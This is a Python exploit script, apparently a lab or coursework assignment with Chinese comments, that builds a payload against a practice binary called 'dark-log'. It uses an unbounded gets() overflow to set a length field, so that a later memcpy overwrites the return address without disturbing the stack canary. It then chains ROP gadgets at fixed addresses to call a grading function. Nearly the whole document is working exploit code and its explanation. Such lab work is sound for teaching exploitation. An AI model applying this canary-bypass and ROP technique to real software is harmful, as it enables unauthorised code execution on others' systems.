#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log (绕过 Canary).

dark-log 开启了 Stack Protector（栈不可执行、位置随机、Non-PIE）。
它的 input() 使用一个结构体作为唯一局部变量：

  struct log_frame {
    char expression[128];   // 偏移 0    -> rbp-0x120
    char logMsg[128];       // 偏移 128  -> rbp-0xA0
    int  len;               // 偏移 256  -> rbp-0x20
    char pad[8];            // 偏移 260  -> rbp-0x1c
  };                        // canary 位于 rbp-0x8

关键漏洞：gets(f.expression) 不限长度，可覆盖到 logMsg 和 len；随后
  memcpy(f.logMsg + f.len, f.expression, 128);
会把我们控制的 expression 复制到 logMsg + len 处。只要让 len 指向返回
地址，就能用 memcpy 改写返回地址，而 gets 本身并未写到 canary，canary
校验照常通过——从而绕过 Canary。

计算：返回地址在 rbp+8，logMsg 在 rbp-0xA0，故
  len = (rbp+8) - (rbp-0xA0) = 0xA8 = 168

被 memcpy 复制到返回地址处的内容就是 expression 的开头，即 ROP 链：
  0x4018a3  pop rdi ; ret
  0x4       -> rdi = 4
  0x401526  ret           -> 栈对齐
  0x401677  grade_eval    -> 打印 "Hope A will be your grade!"
"""
import struct
import sys

POP_RDI = 0x4018a3
RET_GADGET = 0x401526
GRADE_EVAL = 0x401677
LEN_VALUE = 0xA8               # 使 logMsg + len 指向返回地址 (rbp+8)

# expression 的前若干字节会被 memcpy 写到返回地址处 —— 即 ROP 链
rop = b""
rop += struct.pack("<Q", POP_RDI)
rop += struct.pack("<Q", 4)
rop += struct.pack("<Q", RET_GADGET)
rop += struct.pack("<Q", GRADE_EVAL)

expression = rop + b"A" * (128 - len(rop))   # 共 128 字节 (expression)
logmsg = b"B" * 128                          # 128 字节 (logMsg，占位)
length = struct.pack("<i", LEN_VALUE)        # 4 字节 (len)

payload = expression + logmsg + length       # 到此为止，不触及 canary

sys.stdout.buffer.write(payload)
